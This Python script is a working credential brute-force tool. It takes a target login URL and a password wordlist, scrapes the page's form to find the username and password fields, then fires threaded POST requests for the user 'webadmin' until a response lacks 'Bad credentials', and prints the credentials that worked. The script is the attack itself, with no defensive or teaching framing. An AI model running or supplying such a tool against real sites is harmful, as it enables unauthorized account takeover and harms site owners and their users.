import threading
import time
import requests
import os
import bs4 as bs

target = "" # target: http://example.com/login
threads = 10 # thread amm
correct_text = "" #text that shows up if success
incorrect_text = "" # the text that shows up if fail [NEED TO CHANGE]
has_csrf = False # if csrf
posting = True # if post

which = "" #required, if either correct or incorrect checking
wordlist_loc = ""
auto_inputs = []
username = "webadmin"
passwordlist = ""
ending = False



def check_if_success(username, passwd, response):
    if which == "correct":
        if correct_text in response:
            print(username+":"+passwd)
    else:
        if incorrect_text in response:
            pass
            #print(response)
            #print(incorrect_text)
            #print(f"wrong: {passwd}")
        else:
            print(username+":"+passwd+ "                                   ")
            global ending
            ending = True


def attack(username, password, proxy, postdata):
    if proxy == "none":
        if posting:
            #print(postdata)
            req = requests.post(target, data=postdata)
            #print(req.text)
            check_if_success(username, password, req.text)
    else:
        #stuff with proxy
        #if posting:
            #req = requests.post(target, data=data)
            #check_if_success(passwd, req.text)
        pass


def collect_proxies():
    pass



#the auto method finds the form automatically, and starts attacking it automatically
def auto():
    inputs = []
    login_page = requests.get(target)
    soup = bs.BeautifulSoup(login_page.text,'lxml')
    form = soup.find('form')
    form = str(form).split('<')

    for line in form:

        if 'input' in line:
            #print(str(line))
            auto_inputs.append("<" + line.strip())



    #messy code for creating form data
    form_data = {}
    user_change = ""
    pass_change = ""
    for input in auto_inputs:
        input = input.split(" ")
        thename = ""
        thevalue = ""
        for i in range(len(input)):

            if "name=" in input[i]:
                name_thing = input[i].split(input[i][input[i].find("=")+1])
                thename = name_thing[1]
                if ("username" in thename or "name" in thename or "email" in thename):
                    user_change = thename #save name of the username thing we are changing
                if ("pass" in thename):

                    pass_change = thename  #save name of the password thing we are changing

            if "value=" in input[i]:
                value_thing = input[i].split(input[i][input[i].find("=")+1])
                thevalue = value_thing[1]
        form_data[thename] = thevalue
        #have to make the incorrect text detection
        global incorrect_text
        incorrect_text = "Bad credentials"

        #end of detection

        #time to start attacking
    for password in passwordlist:
        time.sleep(0.025)
        if ending:

            break
        password = password.strip()
        #print(form_data)
        form_data[user_change] = username
        form_data[pass_change] = password
        final_data = ""
        #print(form_data)
        #print(form_data.keys())
        for key in form_data.keys():
            #print(key)
            final_data += key + "=" + form_data[key] + "&"
            #print(final_data)


        final_data = final_data[:-1]
        #print(final_data)

        while threading.active_count() >= 5:
            time.sleep(1)
        thread = threading.Thread(target=attack, args=(username, password, "none", form_data,))
        thread.start()
        print(f"Trying: {username}:{password}                          ", end="\r")









target = input("target: ")
wordlist_loc = input("password wordlist: ")
passwordlist = open(wordlist_loc, "r")
isauto = input("(a)uto or (m)anual: ")
if isauto == "a":
    auto()
